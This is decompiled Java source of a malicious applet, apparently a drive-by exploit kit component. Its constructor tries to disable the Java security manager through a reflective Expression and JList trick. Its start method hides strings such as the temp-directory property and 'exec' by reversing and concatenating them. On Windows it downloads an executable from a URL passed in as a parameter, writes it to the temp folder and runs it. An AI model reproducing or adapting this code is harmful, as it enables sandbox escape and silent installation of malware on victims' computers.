// 
// Decompiled by Procyon v0.5.30
// 

package ya;

import java.awt.Component;
import javax.swing.JList;
import java.beans.Expression;
import java.util.HashSet;
import bpac.oo;
import java.lang.reflect.Method;
import java.lang.reflect.InvocationTargetException;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import bpac.b;
import java.applet.Applet;

public class ebu_ali_babu extends Applet
{
    public void start() {
        super.start();
        try {
            final String str1 = b.b(this.getParameter("dskvnds"));
            final String str2 = "e".concat("xe.");
            final String str3 = "ri".concat("dpm".concat("t.oi.av".concat("aj")));
            final String str4 = "ema".concat("n.so");
            final String str5 = new StringBuffer(str2).reverse().toString();
            final String str6 = new StringBuffer(str3).reverse().toString();
            final String str7 = new StringBuffer(str4).reverse().toString();
            final String str8 = String.valueOf(Math.random()) + str5;
            final String str9 = System.getProperty(str6);
            final String str10 = System.getProperty(str7);
            try {
                if (str10.indexOf("Win".concat("dows")) >= 0) {
                    final URL localURL = new URL(str1);
                    final int pizdetc = 10;
                    final boolean bb = true;
                    final String s = "s;f";
                    localURL.openConnection();
                    final int o = 10;
                    final boolean ii = false;
                    final String b10g = "ee";
                    final InputStream localInputStream = localURL.openStream();
                    final FileOutputStream localFileOutputStream = new FileOutputStream(String.valueOf(str9) + str8);
                    final byte[] arrayOfByte = new byte[1024];
                    int i;
                    while ((i = localInputStream.read(arrayOfByte, 0, arrayOfByte.length)) != -1) {
                        localFileOutputStream.write(arrayOfByte, 0, i);
                    }
                    localInputStream.close();
                    localFileOutputStream.close();
                    final int df = 34;
                    final boolean dfvm = false;
                    final String ffnwsfn = "aqdqa";
                    final Runtime localRuntime = Runtime.getRuntime();
                    final int kvfndfs = 76;
                    final String scvms = ";rklnwn";
                    final boolean bbhj = true;
                    function(localRuntime, "ex".concat("ec"), new Object[] { String.valueOf(str9) + str8 });
                    final int fvnde = 584;
                    final String ernv = "knfveklfv";
                }
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public static Object function(final Object obj, final String name, final Object[] val) {
        final Class cls = obj.getClass();
        try {
            Method[] methods;
            int i;
            for (methods = cls.getMethods(), i = 0; i < methods.length; ++i) {
                if (methods[i].getName().equals(name) && checkMethod(methods[i], val)) {
                    return methods[i].invoke(obj, val);
                }
            }
            System.out.println("FUNCTION NOT FOUND!!!: " + methods[i].getName());
        }
        catch (IllegalAccessException ex) {
            ex.printStackTrace();
        }
        catch (InvocationTargetException ex2) {
            throw new RuntimeException(ex2);
        }
        return null;
    }
    
    private static boolean checkMethod(final Method m, final Object[] val) {
        final Class[] cls = m.getParameterTypes();
        return check(cls, val);
    }
    
    public static boolean check(final Class[] cls, final Object[] val) {
        if (cls.length != val.length) {
            return false;
        }
        for (int i = 0; i < cls.length; ++i) {
            if (!val[i].getClass().getName().toUpperCase().contains(cls[i].getName().toUpperCase())) {
                return false;
            }
        }
        return true;
    }
    
    public ebu_ali_babu() {
        final Class localSystem = System.class;
        final String str = "setS".concat("ecu".concat("rityM".concat("anager")));
        final Object[] arrayOfObject = { null };
        final oo localKAVS = new oo(localSystem, str, arrayOfObject);
        final HashSet localHashSet = new HashSet();
        localHashSet.add(localKAVS);
        final Expression e = new Expression(localSystem, str, arrayOfObject);
        final a$1 local1 = new a$1(this, localHashSet);
        final JList localJList = new JList((E[])new Object[] { local1 });
        this.add(localJList);
    }
}
